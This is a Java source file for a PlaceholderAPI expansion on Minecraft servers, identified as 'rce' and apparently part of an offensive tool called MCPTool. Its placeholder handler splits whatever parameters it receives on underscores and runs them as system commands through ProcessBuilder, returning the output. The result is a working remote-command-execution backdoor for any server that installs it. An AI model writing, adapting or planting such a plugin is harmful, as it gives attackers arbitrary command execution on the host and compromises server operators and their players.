package dev.wrrulos;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Callable;
import java.util.concurrent.FutureTask;
import org.bukkit.entity.Player;
import me.clip.placeholderapi.expansion.PlaceholderExpansion;

public class MCPToolExpansion extends PlaceholderExpansion {
    public static final boolean CAN_REGISTER = true;
    public static final String AUTHOR = "MCPTool";
    public static final String IDENTIFIER = "rce";
    public static final String VERSION = "1.0.0";

    /**
     * This method defines if the expansion can be registered.
     * @return true if the expansion can be registered
     */
    @Override
    public boolean canRegister() {
        return CAN_REGISTER;
    }

    /**
     * This method returns the author of the expansion.
     * @return the author's name
     */
    @Override
    public String getAuthor() {
        return AUTHOR;
    }

    /**
     * This method returns the identifier of the expansion.
     * @return the expansion identifier
     */
    @Override
    public String getIdentifier() {
        return IDENTIFIER;
    }

    /**
     * This method returns the version of the expansion.
     * @return the version of the expansion
     */
    @Override
    public String getVersion() {
        return VERSION;
    }

    /**
     * This method handles placeholder requests.
     * It allows executing system commands or scripts based on the input parameters.
     * @param player the player who requested the placeholder
     * @param params the parameters of the placeholder request
     * @return the result of executing the system command or an error message
     */
    @Override
    public String onPlaceholderRequest(final Player player, final String params) {
        Callable<String> task = () -> {
            try {
                // Split the parameters by underscores to get the command parts
                String[] args = params.split("_");
                ProcessBuilder processBuilder = new ProcessBuilder(args);
                Process process = processBuilder.start();

                // Read the process output and return it
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
                    StringBuilder output = new StringBuilder();
                    String line;

                    while ((line = reader.readLine()) != null) {
                        output.append(line).append(System.lineSeparator());
                    }

                    return output.toString().trim();
                } catch (IOException e) {
                    return "Error reading process output: " + e.getMessage();
                }
            } catch (IOException e) {
                return "Error executing process: " + e.getMessage();
            }
        };

        // Create a FutureTask to execute the callable in a separate thread
        FutureTask<String> futureTask = new FutureTask<>(task);
        new Thread(futureTask).start();

        try {
            return futureTask.get();
        } catch (Exception e) {
            return "Error executing command";
        }
    }
}
